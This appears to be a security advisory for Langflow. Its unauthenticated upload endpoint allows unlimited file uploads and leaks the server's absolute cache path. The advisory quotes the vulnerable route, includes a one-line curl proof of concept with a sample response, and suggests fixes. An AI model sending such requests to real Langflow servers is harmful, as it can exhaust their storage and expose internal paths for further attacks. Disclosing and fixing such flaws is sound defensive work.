# Security finding

> A code-security scan flagged the vulnerability below. No remediation is included; produce the fix yourself.

**Type:** Information Exposure — CWE-200
**Project:** `langflow-ai/langflow`
**Primary location:** `src/backend/base/langflow/api/v1/endpoints.py`
**Other files possibly involved:** `src/lfx/src/lfx/load/utils.py`

## Details

### Summary
Unauthenticated users can upload any amount of data to the server without any limitations. No need for any prior knowledge, only network access to Langflow.

This can lead to space exhaustion on the server.

In adition, in the response, the absolute path of the uploaded file is reported to the attacker, which is an information leak that can assist in chaining other primitives.

### Details
Code is in `langflow/api/v1/[endpoints.py](http://endpoints.py/)`:
```python
@router.post(
    "/upload/{flow_id}",
    status_code=HTTPStatus.CREATED,
    deprecated=True,
)
async def create_upload_file(
    file: UploadFile,
    flow_id: UUID,
) -> UploadFileResponse:
...
```
As can be seen above, there is no authentication. There is not validation over `flow_id` as well, unlike other endpoints:
```
        flow_id_str = str(flow_id)
        file_path = await asyncio.to_thread(save_uploaded_file, file, folder_name=flow_id_str)
```
Function `save_uploaded_file` saves the file to local file-system.
Suggested fix:
1. Add authentication to route.
2. Only return relative path or filename.

### PoC
PoC:
```bash
curl 'http://localhost:7860/api/v1/upload/<any_uuid>' -F "file=@<any_file>"
```

Example:
```bash
# curl 'http://localhost:7860/api/v1/upload/11111111-1111-1111-1111-111111111111' -F "file=@/tmp/dummy.txt"
{"flowId":"11111111-1111-1111-1111-111111111111","file_path":"/Users/ori/Library/Caches/langflow/11111111-1111-1111-1111-111111111111/9d63c3b5b7623d1fa3dc7fd1547313b9546c6d0fbbb6773a420613b7a17995c8.txt"}
```

### Impact
1. Space exhaustion on server that can lead to Denial-of-Service.
2. Information leak - leakage of absolute path of langflow's cache directory in server.
